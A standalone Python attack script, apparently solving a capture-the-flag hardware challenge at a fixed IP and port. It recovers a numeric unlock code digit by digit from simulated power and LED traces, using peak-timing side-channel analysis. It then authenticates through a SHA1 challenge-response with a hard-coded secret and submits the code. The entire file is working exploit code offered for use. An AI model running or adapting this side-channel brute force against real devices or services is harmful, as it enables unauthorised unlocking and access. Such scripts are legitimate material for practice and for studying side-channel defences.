#!/usr/bin/env python3
from __future__ import annotations

from dataclasses import dataclass
from typing import List, Tuple, Dict, Optional
import socket
import struct
import sys
import hashlib
from time import sleep


@dataclass
class TraceData:
    label: str
    samples: List[float]


class Exploit:
    def __init__(
        self,
        host: str,
        port: int,
        timeout: float = 5.0,
        delta_drop_threshold: int = 50,
        unlock_led_span_threshold: float = 1.0,
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.valid_chars = "0123456789"
        self.delta_drop_threshold = delta_drop_threshold
        self.unlock_led_span_threshold = unlock_led_span_threshold

    # ---------- socket helpers ----------

    @staticmethod
    def _read_exact(conn: socket.socket, n_bytes: int) -> bytes:
        """Read exactly n_bytes or raise ConnectionError if the peer closes."""
        buf = bytearray(n_bytes)
        view = memoryview(buf)
        got = 0
        while got < n_bytes:
            n = conn.recv_into(view[got:])
            if n == 0:
                raise ConnectionError("Socket closed while reading.")
            got += n
        return bytes(buf)

    @staticmethod
    def _readline(fp) -> bytes:
        """Read a line (including newline) from a file-like object."""
        line = fp.readline()
        if not line:
            raise ConnectionError("Socket closed while reading a line.")
        return line

    # ---------- protocol pieces ----------

    def _recv_trace(self, conn: socket.socket) -> TraceData:
        label_len = struct.unpack("<I", self._read_exact(conn, 4))[0]
        label = self._read_exact(conn, label_len).decode("ascii", errors="replace")
        trace_len = struct.unpack("<I", self._read_exact(conn, 4))[0]

        # Each sample is a little-endian float32
        raw = self._read_exact(conn, trace_len * 4)
        samples = [f[0] for f in struct.iter_unpack("<f", raw)]
        return TraceData(label, samples)

    @staticmethod
    def _find_peaks(trace: List[float]) -> List[Tuple[int, float]]:
        if not trace:
            return []
        min_val = min(trace)
        max_val = max(trace)
        threshold = (max_val - min_val) / 2.0 + min_val
        peaks: List[Tuple[int, float]] = []
        state = 0
        for i, value in enumerate(trace):
            if state == 0 and value > threshold:
                state = 1
                peaks.append((i, value))
            elif state == 1 and value < threshold:
                state = 0
        return peaks

    @staticmethod
    def _calc_delta_peaks(peaks: List[Tuple[int, float]]) -> List[int]:
        """Index differences between successive peaks; first is from 0 to first peak."""
        if not peaks:
            return []
        deltas = [peaks[0][0]]
        for prev, curr in zip(peaks, peaks[1:]):
            deltas.append(curr[0] - prev[0])
        return deltas

    def _run_attempt(self, conn: socket.socket, code: str) -> Dict[str, List[float]]:
        print(f"Attempting code: {code}")
        conn.sendall(code.encode("ascii") + b"\n")
        traces: Dict[str, List[float]] = {}
        for _ in range(3):
            td = self._recv_trace(conn)
            traces[td.label] = td.samples
        return traces

    # ---------- high-level flows ----------

    def analyze_power_trace(self) -> str:
        with socket.create_connection((self.host, self.port), timeout=self.timeout) as conn:
            conn.settimeout(self.timeout)
            fp = conn.makefile("rb", buffering=0)

            # Read initial greeting (server prints two lines)
            print(self._readline(fp).decode(errors="replace").rstrip())
            print(self._readline(fp).decode(errors="replace").rstrip())

            conn.recv(1024)  # discard
            conn.sendall(b"password")
            conn.recv(1024)  # discard

            code_chars: List[str] = ["A"]  # placeholder char for each position
            last_delta: Optional[int] = None
            char_pos = 0
            curr_digit_index = 0

            while True:
                if curr_digit_index >= len(self.valid_chars):
                    print(f"Failed to determine char at position {char_pos}")
                    break

                # Try next digit
                code_chars[char_pos] = self.valid_chars[curr_digit_index]
                curr_digit_index += 1

                traces = self._run_attempt(conn, "".join(code_chars))

                # Read line from server after attempt
                _ = self._readline(fp)

                mcu_trace = traces.get("trace_mcu", [])
                peaks = self._find_peaks(mcu_trace)
                deltas = self._calc_delta_peaks(peaks)
                if not deltas:
                    continue

                latest_delta = deltas[-1]
                if last_delta is None:
                    last_delta = latest_delta
                    continue

                # Detect a substantial drop in cycle distance between peaks
                if (last_delta - latest_delta) > self.delta_drop_threshold:
                    led_unlocked = traces.get("trace_led_unlocked", [])
                    if led_unlocked:
                        span = (max(led_unlocked) - min(led_unlocked))
                        if span > self.unlock_led_span_threshold:
                            print("Successfully unlocked!")
                            break  # code_chars contains the found digits so far

                    # Move to next character position
                    last_delta = latest_delta
                    char_pos += 1
                    curr_digit_index = 0
                    code_chars.append("A")  # extend placeholder for next position

            return "".join(code_chars)

    def authenticate(self, code: str, secret: str = "qvb4a1b07E870B"):
        with socket.create_connection((self.host, self.port), timeout=self.timeout) as conn:
            conn.settimeout(self.timeout)
            # Read two lines (banner/prompt)
            for _ in range(2):
                print(conn.recv(1024).strip().decode(errors="replace"))
            conn.sendall(b"auth")
            for _ in range(2):
                print(conn.recv(1024).strip().decode(errors="replace"))
            sleep(0.1)
            conn.sendall(b"getChallenge")
            response = conn.recv(1024).strip().decode(errors="replace")
            parts = response.split(":", 1)
            if len(parts) != 2:
                raise RuntimeError(f"Unexpected challenge response: {response}")
            challenge = parts[1]
            message = challenge + secret
            sha_hash = hashlib.sha1(message.encode()).hexdigest()
            resp = f"resp:{challenge}:{sha_hash}".encode("ascii")
            conn.sendall(resp)
            for _ in range(2):
                print(conn.recv(1024).strip().decode(errors="replace"))
            conn.sendall(code.encode("ascii"))
            for _ in range(2):
                print(conn.recv(1024).strip().decode(errors="replace"))


def _parse_host_port(arg: str) -> Tuple[str, int]:
    if ":" not in arg:
        raise ValueError("Expected <host:port>")
    h, p = arg.rsplit(":", 1)
    return h, int(p)


def main():
    if len(sys.argv) < 2:
        host, port = "94.237.49.23", 32577
    else:
        if sys.argv[1].lower() in ("-h", "--help"):
            print("Usage: python3 exploit.py [ip:port]")
            sys.exit(0)
        host, port = _parse_host_port(sys.argv[1])

    analyzer = Exploit(host, port)
    code = analyzer.analyze_power_trace()
    print(f"Derived code: {code}")
    analyzer.authenticate(code)


if __name__ == "__main__":
    main()
